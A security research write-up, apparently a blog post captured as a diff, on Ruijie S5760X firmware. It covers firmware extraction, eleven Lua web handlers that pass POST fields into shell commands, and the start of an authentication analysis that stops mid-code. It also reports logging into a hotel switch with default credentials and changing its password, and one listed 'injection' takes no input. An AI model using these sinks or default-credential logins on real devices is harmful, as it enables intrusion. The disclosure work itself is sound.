@@ -1,0 +1,798 @@
+<!DOCTYPE html><html lang="en" data-scroll-behavior="smooth"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/chunks/04mzt9x86awfs.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/0tqtjom54jba3.js"/><script src="/_next/static/chunks/0pqt~8bl3ukh4.js" async=""></script><script src="/_next/static/chunks/0174xh3wfsjm1.js" async=""></script><script src="/_next/static/chunks/0-v-~ztg5yppn.js" async=""></script><script src="/_next/static/chunks/turbopack-11qp1p62mtbcg.js" async=""></script><script src="/_next/static/chunks/0a6vvedg20z8_.js" async=""></script><script src="/_next/static/chunks/0d3shmwh5_nmn.js" async=""></script><script src="/_next/static/chunks/0gm4~9_sxn0dp.js" async=""></script><title>Inside the Ruijie S5760X. — Security Research</title><meta name="description" content="Firmware extraction, HTTP services, and authentication boundaries."/><link rel="icon" href="/icon.svg"/><script src="/_next/static/chunks/03~yq9q893hmn.js" noModule=""></script></head><body><div hidden=""><!--$--><!--/$--></div><a class="skip-link" href="#main">Skip to content</a><header class="site-header wrap"><a class="brand" aria-label="Security Research home" href="/"><span class="monogram" aria-hidden="true">S<span>R</span></span><span class="brand-name">Security Research</span></a><nav class="desktop-nav" aria-label="Main navigation"><a aria-current="page" href="/articles/">Articles</a><a href="/notes/">Notes</a><a href="/about/">About</a></nav><div class="header-actions"><a class="icon-link" aria-label="Search" href="/search/"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="10.5" cy="10.5" r="6.7"></circle><path d="m16 16 4.5 4.5"></path></svg></a><button class="menu-button" aria-label="Open menu" aria-expanded="false" aria-controls="mobile-nav"><span></span><span></span></button></div><nav id="mobile-nav" class="mobile-nav" aria-label="Mobile navigation" hidden=""><a aria-current="page" href="/articles/">Articles</a><a href="/notes/">Notes</a><a href="/about/">About</a></nav></header><main id="main" class="wrap" tabindex="-1"><header class="article-head"><div class="breadcrumb"><a href="/articles/">Research / <!-- -->Firmware Reversing</a><span class="pill">RESEARCH</span></div><h1>Inside the Ruijie S5760X.</h1><p class="deck">Firmware extraction, HTTP services, and authentication boundaries.</p><div class="article-byline"><span>Security Research<!-- -->   /   <time dateTime="2023-06-24">2023-06-24</time></span><span>12 min read</span></div></header><div class="article-layout"><article class="prose"><details class="mobile-toc"><summary>On this page</summary><nav aria-label="Table of contents"><a class="active" aria-current="location" href="#section-1">Firmware extraction</a><a href="#section-2">Vulnerability research</a><a href="#section-3">Service reconnaissance</a><a href="#section-4">Investigating the HTTP service</a></nav></details><p class="source-note">Research notes · <!-- -->Ruijie S5760X vulnerability research</p><h2 id="section-1">Firmware extraction</h2>
+<p><a href="https://www.ruijie.com.cn/fw/rj-cp-s5760x/" rel="noopener noreferrer">Ruijie S5760X firmware downloads</a>
+Firmware version: <code>S5760X_RGOS12.3(1)B0701</code>.
+Information from the downloaded package:</p>
+<div class="code-block"><div class="code-toolbar"><span>CODE</span><span class="copy-status" role="status"></span><button class="copy-button" aria-label="Copy code">Copy ⧉</button></div><pre tabindex="0" aria-label="Code, scroll horizontally"><code>main-1.0.0.562ec491-1
+T44817e735a877cae967354a9a8a60c974c15c706
+main
+1.0.0.562ec491
+main upgrade package
+[kernel]
+name=kernel.img
+ver=4.9.190.43b2daf311bf3f
+[rootfs]
+name=rootfs.sqsh
+ver=1.0.0.b1028d65
+sup_list=0xc080;0xc081;0xc082;0xc0b7;0xc0b8;0xc0c5;
+serial_list=137;104
+[softver]
+ver=RGOS 12.5(4)B0702P4
+spec_flag=0
+[uboot_info]
+num=2
+[uboot1]
+name=u-boot-s57x.bin
+ver=1.4.25
+sup_list=0x201000d0;0x201000e0;0x201000f0;0x20270020;0x20100180
+[uboot2]
+name=u-boot-s5760x_2g.bin
+ver=1.4.25
+sup_list=0x20100170;0x20100160
+[rboot_info]
+num=1
+[rboot1]
+name=rboot-arm64-ctc-1.1.35.bin
+ver=1.1.35
+sup_list=0x201000d0;0x201000e0;0x201000f0;0x20270020;0x20350010;0x20350020;0x20350030;0x20350040;0x20350050;0x20350060;0x20350070;0x20350080;0x20350090;0x203500a0;0x203500b0;0x203500c0;0x300f0070;0x20100160;0x20100170;0x20100180;0x300f0080
+412x-131
+RUIJIE
+12_main
+linux
+4bPDrbPDr983595fb39186f7853748c4bf5cdbff6
+514d6f5ee0625d421f4a39e63893507c
+a10da9bf913dc09f4c2bcc70e938ba00
+1a08e2c04edd1b1d6bf4f67f1cd60a37
+7d9ab2252d617bb3ef650ed0b141c643
+5a25e57fc5de4b36eb29989ada458ac4
+fb5f8192c0218c618a08d686da938469
+root
+root
+root
+root
+root
+root
+root
+root
+root
+root
+root
+root
+root
+root
+main-1.0.0.562ec491-1.src.rpm
+main
+rpmlib(PayloadFilesHavePrefix)
+rpmlib(CompressedFileNames)
+4.0-1
+3.0.4-1
+4.11.1
+1.0.0.562ec491-1
+fdt.img
+initrd.img
+kernel.img
+rboot-arm64-ctc-1.1.35.bin
+rootfs.sqsh
+u-boot-s5760x_2g.bin
+u-boot-s57x.bin
+-O2 -g
+cpio
+gzip
+%{_target_platform}
+</code></pre></div>
+<p>The package is an RPM, so its filesystem can be extracted with the following commands:</p>
+<div class="code-block"><div class="code-toolbar"><span>CODE</span><span class="copy-status" role="status"></span><button class="copy-button" aria-label="Copy code">Copy ⧉</button></div><pre tabindex="0" aria-label="Code, scroll horizontally"><code>rpm2cpio 2222.rpm | cpio -div
+
+./fdt.img
+./initrd.img
+./kernel.img
+./rboot-arm64-ctc-1.1.35.bin
+./rootfs.sqsh
+./u-boot-s5760x_2g.bin
+./u-boot-s57x.bin
+297803 blocks
+
+</code></pre></div>
+<h2 id="section-2">Vulnerability research</h2>
+<div class="article-image-row">Device noted during the original research: a hotel switch at <code>192.168.48.73</code>. The default credentials <code>admin:admin</code> worked; the password was then changed to <code>123456</code>.
+<figure class="article-figure"><img src="/images/articles/ruijie-s5760x-research/01.png" width="2428" height="1162" style="width:2428px;aspect-ratio:2428 / 1162" alt="" loading="lazy"/></figure>
+<figure class="article-figure"><img src="/images/articles/ruijie-s5760x-research/02.png" width="2340" height="768" style="width:2340px;aspect-ratio:2340 / 768" alt="" loading="lazy"/></figure>
+<figure class="article-figure"><img src="/images/articles/ruijie-s5760x-research/03.png" width="2376" height="1076" style="width:2376px;aspect-ratio:2376 / 1076" alt="" loading="lazy"/></figure>
+<figure class="article-figure"><img src="/images/articles/ruijie-s5760x-research/04.png" width="2452" height="1164" style="width:2452px;aspect-ratio:2452 / 1164" alt="" loading="lazy"/></figure>
+Internal network:
+<figure class="article-figure"><img src="/images/articles/ruijie-s5760x-research/05.png" width="2436" height="542" style="width:2436px;aspect-ratio:2436 / 542" alt="" loading="lazy"/></figure>
+<figure class="article-figure"><img src="/images/articles/ruijie-s5760x-research/06.png" width="2276" height="628" style="width:2276px;aspect-ratio:2276 / 628" alt="" loading="lazy"/></figure>
+<figure class="article-figure"><img src="/images/articles/ruijie-s5760x-research/07.png" width="1012" height="1552" style="width:1012px;aspect-ratio:1012 / 1552" alt="" loading="lazy"/></figure>
+Tracing login and related requests led to the following key files:
+<code>sbin/web</code>
+The backend uses Lua. The issue appeared applicable across the B0701 software examined here.</div>
+<h3>httpd lua vulnbility 11</h3>
+<p>Searching the relevant functions identified eleven command injection locations:</p>
+<div class="code-block"><div class="code-toolbar"><span>LUA</span><span class="copy-status" role="status"></span><button class="copy-button" aria-label="Copy code">Copy ⧉</button></div><pre tabindex="0" aria-label="Code, scroll horizontally"><code class="hljs language-lua">
+<span class="hljs-comment">-- http://192.168.48.73/web/init.lua/ac.sumng.sumng/mvSumngFile</span>
+
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> GLOBAL_IN) <span class="hljs-keyword">then</span>  <span class="hljs-keyword">return</span>;   <span class="hljs-keyword">end</span>
+<span class="hljs-keyword">local</span> cgilua = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;cgilua&quot;</span>);
+<span class="hljs-keyword">local</span> Page = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;web.lib.page&quot;</span>);
+<span class="hljs-keyword">local</span> <span class="hljs-built_in">log</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;web.lib.logger&quot;</span>).<span class="hljs-built_in">log</span>;
+<span class="hljs-keyword">local</span> Utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;web.lib.utils&quot;</span>);
+<span class="hljs-keyword">local</span> M = <span class="hljs-built_in">setmetatable</span>({},{ <span class="hljs-built_in">__index</span> = Page }) ;
+<span class="hljs-keyword">local</span> errorPages = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;web.lib.error&quot;</span>);
+
+<span class="hljs-comment">-- Delete all packet-capture files.</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">M.mvSumngFile</span><span class="hljs-params">(self)</span></span>
+    <span class="hljs-keyword">local</span> ret = Utils.IoUtil.retData();
+    <span class="hljs-keyword">local</span> params = cgilua.POST;
+    <span class="hljs-keyword">local</span> filename = params[<span class="hljs-string">&quot;filename&quot;</span>];
+    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">string</span>.<span class="hljs-built_in">find</span>(filename,<span class="hljs-string">&quot;%.%.&quot;</span>)) <span class="hljs-keyword">then</span> <span class="hljs-comment">-- Block path traversal.</span>
+        errorPages.forward403() ;
+        <span class="hljs-keyword">return</span>;
+    <span class="hljs-keyword">end</span>
+    <span class="hljs-keyword">local</span> cmd = <span class="hljs-string">&#x27;mv /data/tmp/vsd/0/security/sumng/&#x27;</span>..filename..<span class="hljs-string">&#x27; /tmp/vsd/0/security/sumng/&#x27;</span>..filename; <span class="hljs-comment">--vulnability</span>
+    <span class="hljs-keyword">local</span> rest = Utils.IoUtil.execShell(cmd);
+    <span class="hljs-built_in">self</span>.jsonOutPut(ret);
+<span class="hljs-keyword">end</span>
+
+<span class="hljs-keyword">return</span> M;
+</code></pre></div>
+<div class="article-image-row">Testing confirmed the issue:
+<figure class="article-figure"><img src="/images/articles/ruijie-s5760x-research/08.png" width="2872" height="1310" style="width:2872px;aspect-ratio:2872 / 1310" alt="" loading="lazy"/></figure></div>
+<div class="article-image-row"><figure class="article-figure"><img src="/images/articles/ruijie-s5760x-research/09.png" width="2878" height="1306" style="width:2878px;aspect-ratio:2878 / 1306" alt="" loading="lazy"/></figure></div>
+<p>Injection point two:</p>
+<div class="code-block"><div class="code-toolbar"><span>LUA</span><span class="copy-status" role="status"></span><button class="copy-button" aria-label="Copy code">Copy ⧉</button></div><pre tabindex="0" aria-label="Code, scroll horizontally"><code class="hljs language-lua">
+<span class="hljs-comment">-- http://192.168.48.73/web/init.lua/ac.system.feature/moveFile</span>
+
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> GLOBAL_IN) <span class="hljs-keyword">then</span>
+    <span class="hljs-keyword">return</span>
+<span class="hljs-keyword">end</span>
+<span class="hljs-keyword">local</span> cgilua = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;cgilua&quot;</span>)
+<span class="hljs-keyword">local</span> Page = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;web.lib.page&quot;</span>)
+<span class="hljs-keyword">local</span> <span class="hljs-built_in">log</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;web.lib.logger&quot;</span>).<span class="hljs-built_in">log</span>
+<span class="hljs-keyword">local</span> Utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;web.lib.utils&quot;</span>)
+<span class="hljs-keyword">local</span> M = <span class="hljs-built_in">setmetatable</span>({}, {<span class="hljs-built_in">__index</span> = Page})
+
+<span class="hljs-comment">--[[
+    Move the signature database file.
+    data = {
+        name = filename
+    }
+]]</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">M.moveFile</span><span class="hljs-params">(self)</span></span>
+    <span class="hljs-keyword">local</span> ret = Utils.IoUtil.retData()
+    <span class="hljs-keyword">local</span> params = cgilua.POST
+    <span class="hljs-keyword">local</span> filename = params[<span class="hljs-string">&quot;name&quot;</span>]
+    <span class="hljs-keyword">local</span> cmd = <span class="hljs-string">&quot;mv -f &quot;</span> .. <span class="hljs-string">&quot;&#x27;/data/&quot;</span> .. filename .. <span class="hljs-string">&quot;&#x27;&quot;</span> .. <span class="hljs-string">&quot; &#x27;/sbin/signature/app_tmp/&quot;</span> .. filename .. <span class="hljs-string">&quot;&#x27;&quot;</span>
+    ret.data = Utils.IoUtil.execShell(cmd)
+    <span class="hljs-built_in">self</span>.jsonOutPut(ret)
+<span class="hljs-keyword">end</span>
+
+<span class="hljs-keyword">return</span> M
+</code></pre></div>
+<div class="article-image-row"><figure class="article-figure"><img src="/images/articles/ruijie-s5760x-research/10.png" width="2878" height="1216" style="width:2878px;aspect-ratio:2878 / 1216" alt="" loading="lazy"/></figure></div>
+<p>Injection point three:</p>
+<div class="code-block"><div class="code-toolbar"><span>LUA</span><span class="copy-status" role="status"></span><button class="copy-button" aria-label="Copy code">Copy ⧉</button></div><pre tabindex="0" aria-label="Code, scroll horizontally"><code class="hljs language-lua">routers/ac/system/system.lua
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">M.delApBin</span> <span class="hljs-params">(self)</span></span> 
+    <span class="hljs-keyword">local</span> ret = Utils.IoUtil.retData();
+    <span class="hljs-keyword">local</span> params = cgilua.POST;
+    <span class="hljs-keyword">local</span> src_tmp = params[<span class="hljs-string">&quot;src&quot;</span>];
+    <span class="hljs-comment">-- Delete only files with a .bin suffix.</span>
+    <span class="hljs-keyword">local</span>  tmp= <span class="hljs-built_in">string</span>.<span class="hljs-built_in">match</span>(src_tmp,<span class="hljs-string">&quot;%.bin$&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-literal">true</span>);
+    <span class="hljs-keyword">if</span> (tmp ~= <span class="hljs-literal">nil</span>) <span class="hljs-keyword">then</span>
+        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">string</span>.<span class="hljs-built_in">find</span>(src_tmp,<span class="hljs-string">&quot;%.%.&quot;</span>)) <span class="hljs-keyword">then</span> <span class="hljs-comment">-- Block path traversal.</span>
+            errorPages.forward403() ;
+            <span class="hljs-keyword">return</span>;
+        <span class="hljs-keyword">end</span>
+        <span class="hljs-keyword">local</span> cmd = <span class="hljs-string">&quot;rm -rf &quot;</span> ..<span class="hljs-string">&quot;&#x27;&quot;</span>.. src_tmp..<span class="hljs-string">&quot;&#x27;&quot;</span>;
+        Utils.IoUtil.execShell(cmd);
+        <span class="hljs-built_in">self</span>.jsonOutPut(ret);
+    <span class="hljs-keyword">end</span>
+
+<span class="hljs-keyword">end</span>
+
+<span class="hljs-keyword">return</span> M;
+</code></pre></div>
+<p>Injection point four:</p>
+<div class="code-block"><div class="code-toolbar"><span>LUA</span><span class="copy-status" role="status"></span><button class="copy-button" aria-label="Copy code">Copy ⧉</button></div><pre tabindex="0" aria-label="Code, scroll horizontally"><code class="hljs language-lua">routers/ac/packet/capture.lua
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> GLOBAL_IN) <span class="hljs-keyword">then</span>  <span class="hljs-keyword">return</span>;   <span class="hljs-keyword">end</span>
+<span class="hljs-keyword">local</span> cgilua = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;cgilua&quot;</span>);
+<span class="hljs-keyword">local</span> Page = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;web.lib.page&quot;</span>);
+<span class="hljs-keyword">local</span> <span class="hljs-built_in">log</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;web.lib.logger&quot;</span>).<span class="hljs-built_in">log</span>;
+<span class="hljs-keyword">local</span> Utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;web.lib.utils&quot;</span>);
+<span class="hljs-keyword">local</span> M = <span class="hljs-built_in">setmetatable</span>({},{ <span class="hljs-built_in">__index</span> = Page }) ;
+<span class="hljs-keyword">local</span> errorPages = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;web.lib.error&quot;</span>);
+
+<span class="hljs-comment">-- Delete all packet-capture files.</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">M.movepcap</span><span class="hljs-params">(self)</span></span>
+    <span class="hljs-keyword">local</span> ret = Utils.IoUtil.retData();
+    <span class="hljs-keyword">local</span> params = cgilua.POST;
+    <span class="hljs-keyword">local</span> <span class="hljs-built_in">path</span> = params[<span class="hljs-string">&quot;path&quot;</span>];
+    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">string</span>.<span class="hljs-built_in">find</span>(<span class="hljs-built_in">path</span>,<span class="hljs-string">&quot;%.%.&quot;</span>)) <span class="hljs-keyword">then</span> <span class="hljs-comment">-- Block path traversal.</span>
+        errorPages.forward403() ;
+        <span class="hljs-keyword">return</span>;
+    <span class="hljs-keyword">end</span>
+    <span class="hljs-keyword">local</span> cmd = <span class="hljs-string">&#x27;rm -rf &#x27;</span>..<span class="hljs-built_in">path</span>..<span class="hljs-string">&#x27;/*.pcap&#x27;</span>;
+    <span class="hljs-keyword">local</span> rest = Utils.IoUtil.execShell(cmd);
+    <span class="hljs-built_in">self</span>.jsonOutPut(ret);
+<span class="hljs-keyword">end</span>
+
+<span class="hljs-keyword">return</span> M;
+
+</code></pre></div>
+<p>Injection point five:</p>
+<div class="code-block"><div class="code-toolbar"><span>LUA</span><span class="copy-status" role="status"></span><button class="copy-button" aria-label="Copy code">Copy ⧉</button></div><pre tabindex="0" aria-label="Code, scroll horizontally"><code class="hljs language-lua">routers/common/system/platform.lua
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">M.moveFile</span> <span class="hljs-params">(self)</span></span> 
+    <span class="hljs-keyword">local</span> ret = Utils.IoUtil.retData();
+    <span class="hljs-keyword">local</span> params = cgilua.POST;
+    <span class="hljs-keyword">local</span> src_tmp = params[<span class="hljs-string">&quot;src&quot;</span>];
+    <span class="hljs-keyword">local</span> dest_tmp = params[<span class="hljs-string">&quot;dest&quot;</span>];
+    <span class="hljs-keyword">local</span> cmd =<span class="hljs-string">&quot;mv -f &quot;</span> ..<span class="hljs-string">&quot;&#x27;/data/.rgos/vsd/0/oam/&quot;</span>.. src_tmp ..<span class="hljs-string">&quot;&#x27;&quot;</span>.. <span class="hljs-string">&quot; &#x27;/data/.rgos/vsd/0/oam/&quot;</span> .. dest_tmp ..<span class="hljs-string">&quot;&#x27;&quot;</span>;
+    ret.data = Utils.IoUtil.execShell(cmd);
+    <span class="hljs-built_in">self</span>.jsonOutPut(ret);
+<span class="hljs-keyword">end</span>
+</code></pre></div>
+<p>Injection point six:</p>
+<div class="code-block"><div class="code-toolbar"><span>LUA</span><span class="copy-status" role="status"></span><button class="copy-button" aria-label="Copy code">Copy ⧉</button></div><pre tabindex="0" aria-label="Code, scroll horizontally"><code class="hljs language-lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">M.moveZip</span> <span class="hljs-params">(self)</span></span> 
+    <span class="hljs-keyword">local</span> ret = Utils.IoUtil.retData();
+    <span class="hljs-keyword">local</span> params = cgilua.POST;
+    <span class="hljs-keyword">local</span> src_tmp = params[<span class="hljs-string">&quot;src&quot;</span>];
+    <span class="hljs-keyword">local</span> dest_tmp = params[<span class="hljs-string">&quot;dest&quot;</span>];
+      <span class="hljs-comment">-- Delete only files with a .zip suffix.</span>
+    <span class="hljs-keyword">local</span>  tmp= <span class="hljs-built_in">string</span>.<span class="hljs-built_in">match</span>(src_tmp,<span class="hljs-string">&quot;%.zip$&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-literal">true</span>);
+    <span class="hljs-keyword">if</span> (tmp ~= <span class="hljs-literal">nil</span>) <span class="hljs-keyword">then</span>
+        <span class="hljs-keyword">local</span> cmd =<span class="hljs-string">&quot;mv -f &quot;</span> ..<span class="hljs-string">&quot;&#x27;&quot;</span>.. src_tmp ..<span class="hljs-string">&quot;&#x27;&quot;</span>.. <span class="hljs-string">&quot; &#x27;&quot;</span> .. dest_tmp ..<span class="hljs-string">&quot;&#x27;&quot;</span>;
+        ret.data = Utils.IoUtil.execShell(cmd);
+        <span class="hljs-built_in">self</span>.jsonOutPut(ret);
+    <span class="hljs-keyword">end</span>
+<span class="hljs-keyword">end</span>
+</code></pre></div>
+<p>Injection point seven:</p>
+<div class="code-block"><div class="code-toolbar"><span>LUA</span><span class="copy-status" role="status"></span><button class="copy-button" aria-label="Copy code">Copy ⧉</button></div><pre tabindex="0" aria-label="Code, scroll horizontally"><code class="hljs language-lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">M.delSumFile</span> <span class="hljs-params">(self)</span></span> 
+    <span class="hljs-keyword">local</span> ret = Utils.IoUtil.retData();
+    <span class="hljs-keyword">local</span> params = cgilua.POST;
+    <span class="hljs-keyword">local</span> src_tmp = params[<span class="hljs-string">&quot;src&quot;</span>];
+    <span class="hljs-comment">-- Delete only when the path matches this directory.</span>
+    <span class="hljs-keyword">local</span>  tmp= <span class="hljs-built_in">string</span>.<span class="hljs-built_in">match</span>(src_tmp,<span class="hljs-string">&quot;/tmp/vsd/0/security/sumng/&quot;</span>);
+    <span class="hljs-keyword">if</span> (tmp ~= <span class="hljs-literal">nil</span>) <span class="hljs-keyword">then</span>
+    <span class="hljs-keyword">local</span> cmd = <span class="hljs-string">&quot;rm -rf &quot;</span> ..<span class="hljs-string">&quot;&#x27;&quot;</span>.. src_tmp..<span class="hljs-string">&quot;&#x27;&quot;</span>;
+    Utils.IoUtil.execShell(cmd);
+    <span class="hljs-built_in">self</span>.jsonOutPut(ret);
+    <span class="hljs-keyword">end</span>
+<span class="hljs-keyword">end</span>
+</code></pre></div>
+<p>Injection point eight:</p>
+<div class="code-block"><div class="code-toolbar"><span>LUA</span><span class="copy-status" role="status"></span><button class="copy-button" aria-label="Copy code">Copy ⧉</button></div><pre tabindex="0" aria-label="Code, scroll horizontally"><code class="hljs language-lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">M.delOamFile</span> <span class="hljs-params">(self)</span></span> 
+    <span class="hljs-keyword">local</span> ret = Utils.IoUtil.retData();
+    <span class="hljs-keyword">local</span> params = cgilua.POST;
+    <span class="hljs-keyword">local</span> src_tmp = params[<span class="hljs-string">&quot;src&quot;</span>];
+    <span class="hljs-keyword">local</span> cmd = <span class="hljs-string">&quot;rm -rf &quot;</span> ..<span class="hljs-string">&quot;&#x27;/data/.rgos/vsd/0/oam/&quot;</span>.. src_tmp..<span class="hljs-string">&quot;&#x27;&quot;</span>;
+    Utils.IoUtil.execShell(cmd);
+    <span class="hljs-built_in">self</span>.jsonOutPut(ret);
+<span class="hljs-keyword">end</span>
+</code></pre></div>
+<p>Injection point nine:</p>
+<div class="code-block"><div class="code-toolbar"><span>LUA</span><span class="copy-status" role="status"></span><button class="copy-button" aria-label="Copy code">Copy ⧉</button></div><pre tabindex="0" aria-label="Code, scroll horizontally"><code class="hljs language-lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">M.delZip</span><span class="hljs-params">(self)</span></span> 
+    <span class="hljs-keyword">local</span> ret = Utils.IoUtil.retData();
+    <span class="hljs-keyword">local</span> params = cgilua.POST;
+    <span class="hljs-keyword">local</span> src_tmp = params[<span class="hljs-string">&quot;src&quot;</span>];
+    <span class="hljs-keyword">local</span> cmd = <span class="hljs-string">&quot;rm -rf &quot;</span> ..<span class="hljs-string">&quot;&#x27;/data/&quot;</span>.. src_tmp..<span class="hljs-string">&quot;&#x27;&quot;</span>;
+    Utils.IoUtil.execShell(cmd);
+    <span class="hljs-built_in">self</span>.jsonOutPut(ret);
+<span class="hljs-keyword">end</span>
+</code></pre></div>
+<p>Injection point ten:</p>
+<div class="code-block"><div class="code-toolbar"><span>LUA</span><span class="copy-status" role="status"></span><button class="copy-button" aria-label="Copy code">Copy ⧉</button></div><pre tabindex="0" aria-label="Code, scroll horizontally"><code class="hljs language-lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">M.delTmp</span><span class="hljs-params">(self)</span></span> 
+    <span class="hljs-keyword">local</span> ret = Utils.IoUtil.retData();
+    <span class="hljs-keyword">local</span> cmd = <span class="hljs-string">&quot;rm -rf /data/portal/zip/tmp/&quot;</span>;
+    Utils.IoUtil.execShell(cmd);
+    <span class="hljs-built_in">self</span>.jsonOutPut(ret);
+<span class="hljs-keyword">end</span>
+</code></pre></div>
+<p>Injection point eleven:</p>
+<div class="code-block"><div class="code-toolbar"><span>LUA</span><span class="copy-status" role="status"></span><button class="copy-button" aria-label="Copy code">Copy ⧉</button></div><pre tabindex="0" aria-label="Code, scroll horizontally"><code class="hljs language-lua"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> GLOBAL_IN) <span class="hljs-keyword">then</span>  <span class="hljs-keyword">return</span>;   <span class="hljs-keyword">end</span>
+<span class="hljs-keyword">local</span> cgilua = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;cgilua&quot;</span>)
+<span class="hljs-keyword">local</span> Page = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;web.lib.page&quot;</span>);
+<span class="hljs-keyword">local</span> <span class="hljs-built_in">log</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;web.lib.logger&quot;</span>).<span class="hljs-built_in">log</span>;
+<span class="hljs-keyword">local</span> Utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;web.lib.utils&quot;</span>);
+<span class="hljs-keyword">local</span> M = <span class="hljs-built_in">setmetatable</span>({},{ <span class="hljs-built_in">__index</span> = Page }) ;
+<span class="hljs-keyword">local</span> reloadDao = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;web.routers.common.admin.admin&quot;</span>);
+<span class="hljs-comment">-- Extract the device&#x27;s web.gz package.</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">M.unZipWeb</span><span class="hljs-params">(self)</span></span>
+    <span class="hljs-keyword">local</span> ret = Utils.IoUtil.retData();
+    <span class="hljs-keyword">local</span> params = cgilua.POST;<span class="hljs-comment">-- Parameters supplied by JavaScript.</span>
+    <span class="hljs-keyword">local</span> filname = params.filename;
+    <span class="hljs-keyword">local</span> cmd = <span class="hljs-string">&#x27;rm -rf /var/web.gz\nmv /tmp/vsd/0/oam/httpd/&#x27;</span>..filname..<span class="hljs-string">&#x27; /var/web.gz\nrm -rf /tmp/html\n/sbin/web.gz.sh\nsync&#x27;</span>;
+    <span class="hljs-keyword">if</span>(params.isSwitch) <span class="hljs-keyword">then</span>
+        cmd = <span class="hljs-string">&#x27;rm -rf /sbin/web.gz\nmv /tmp/vsd/0/oam/httpd/&#x27;</span>..filname..<span class="hljs-string">&#x27; /sbin/web.gz\nrm -rf /tmp/html\n/sbin/web.gz.sh\nsync&#x27;</span>;
+    <span class="hljs-keyword">end</span>
+    <span class="hljs-keyword">local</span> rest = Utils.IoUtil.execShell(cmd);
+    <span class="hljs-keyword">local</span> count = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>(rest) <span class="hljs-keyword">do</span> 
+        count = count + <span class="hljs-number">1</span>
+    <span class="hljs-keyword">end</span>
+    ret.code = count
+    
+    <span class="hljs-built_in">self</span>.jsonOutPut(ret);
+<span class="hljs-keyword">end</span>
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">M.reload</span><span class="hljs-params">(self)</span></span>
+    reloadDao:reload(<span class="hljs-literal">false</span>)
+<span class="hljs-keyword">end</span>
+
+<span class="hljs-keyword">return</span> M;
+</code></pre></div>
+<h3>auth analysis</h3>
+<div class="article-image-row">These issues require authentication. To assess whether that boundary could be bypassed, I followed string references to the <code>httpd</code> binary.
+The login request led to the <code>auth</code> string.
+<figure class="article-figure"><img src="/images/articles/ruijie-s5760x-research/11.png" width="1918" height="850" style="width:1918px;aspect-ratio:1918 / 850" alt="" loading="lazy"/></figure>
+The Lua authentication flow is:</div>
+<div class="code-block"><div class="code-toolbar"><span>LUA</span><span class="copy-status" role="status"></span><button class="copy-button" aria-label="Copy code">Copy ⧉</button></div><pre tabindex="0" aria-label="Code, scroll horizontally"><code class="hljs language-lua">web/routers/init.lua -&gt; web/lib/page.lua
+<span class="hljs-comment">-- Pre-action handler: authentication, session setup, and related operations.</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">M.beforeAction</span><span class="hljs-params">(self, controller)</span></span>
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">self</span>.auth) <span class="hljs-keyword">then</span>
+        <span class="hljs-comment">--[[session.open()+
+         local sessData = session.getSessionData()
+         if(not sessData.username) then
+              return false
+         end]]</span>
+        <span class="hljs-comment">-- unauthenticate.unauthenticate.lua can be accessed without login.</span>
+        <span class="hljs-keyword">if</span>(controller == <span class="hljs-string">&quot;unauthenticate.unauthenticate&quot;</span>) <span class="hljs-keyword">then</span>
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+        <span class="hljs-keyword">end</span>
+        M.currentUser = cgilua.servervariable(<span class="hljs-string">&quot;WEBMASTER_USER&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>;
+        <span class="hljs-keyword">if</span> (M.currentUser == <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">then</span>
+            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+        <span class="hljs-keyword">end</span>
+        <span class="hljs-keyword">local</span> list = Utils.StringUtil.split(controller, <span class="hljs-string">&quot;%.&quot;</span>);
